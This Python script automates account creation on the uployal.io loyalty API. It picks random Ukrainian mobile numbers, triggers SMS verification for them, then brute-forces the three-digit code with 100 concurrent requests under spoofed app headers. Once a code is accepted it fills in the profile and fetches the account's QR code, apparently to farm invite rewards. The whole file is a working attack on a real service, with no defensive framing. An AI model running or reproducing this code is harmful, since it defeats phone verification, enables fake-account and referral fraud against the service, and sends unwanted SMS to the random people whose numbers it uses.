import asyncio
import random

import aiohttp

BASE_HEADERS = {
    "The-Timezone-Iana": "Europe/Kiev",
    "X-Application-Id": "c753d964b",
    "Content-Type": "application/json; charset=UTF-8",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "okhttp/4.12.0",
    "Connection": "keep-alive"
}


class InvalidCode(Exception):
    pass


def random_vodafone_number():
    prefix = random.choice(["095", "066", "050"])
    number = random.randint(0, 9999999)
    return f'{prefix}{number:07d}'


def format_number(number: str):
    country_code = "38"
    operator_code = number[:3]
    main_number = number[3:]
    formatted_number = f'+{country_code}({operator_code}){main_number[:3]}-{main_number[3:5]}-{main_number[5:]}'
    return formatted_number


async def register(number: str):
    url = "https://uployal.io/api/mobile/v2.1/consumer/registration/check/"
    data = {"mobile_phone": number, "send_sms": True}
    async with aiohttp.ClientSession(headers=BASE_HEADERS) as session:
        async with session.post(url, json=data) as resp:
            return resp.ok


async def check_code(number: str, code: str, invite_code: str) -> dict:
    payload = {
        "city": 76,
        "invite_code": invite_code,
        "password": code,
        "mobile_phone": number,
    }
    url = "https://uployal.io/api/mobile/v2/consumer/registration/"
    async with aiohttp.ClientSession(headers=BASE_HEADERS) as session:
        async with session.post(url, json=payload) as resp:
            res = await resp.json()
            if resp.ok:
                return res
            raise InvalidCode(f"Code {code} is invalid")


async def bruteforce_code(number: str, concurrency: int = 100, *, invite_code: str):
    tasks = []
    for i in range(0, 1000):
        code = f'{i:03d}'
        tasks.append(check_code(number, code, invite_code))

        if len(tasks) == concurrency:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            good = list(filter(lambda r: not isinstance(r, Exception), results))
            if good:
                return good[0]
            tasks.clear()
    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        good = list(filter(lambda r: not isinstance(r, Exception), results))
        if good:
            return good[0]


async def add_info(token: str, first_name: str, last_name: str):
    url = 'https://uployal.io/api/mobile/v2/consumer/profile/'
    headers = {
        "Authorization": f"JWT {token}",
        **BASE_HEADERS,
    }
    data = {"first_name": first_name, "last_name": last_name, "language": "en", "timezone": "Europe/Kiev"}
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.patch(url, json=data) as resp:
            return await resp.json()


async def get_qr(token):
    url = 'https://uployal.io/api/mobile/v2/consumer/qr-code/'
    headers = {
        "Authorization": f"JWT {token}",
        **BASE_HEADERS,
    }
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(url) as resp:
            return await resp.json()


async def create_account(phone: str, invite_code: str, first_name: str, last_name: str):
    if await register(phone):
        registration_response = await bruteforce_code(phone, invite_code=invite_code)
        token = registration_response['results']['token']
        _, qr = await asyncio.gather(add_info(token, first_name, last_name), get_qr(token))
        return registration_response, qr['results']['qr_code']
    return None
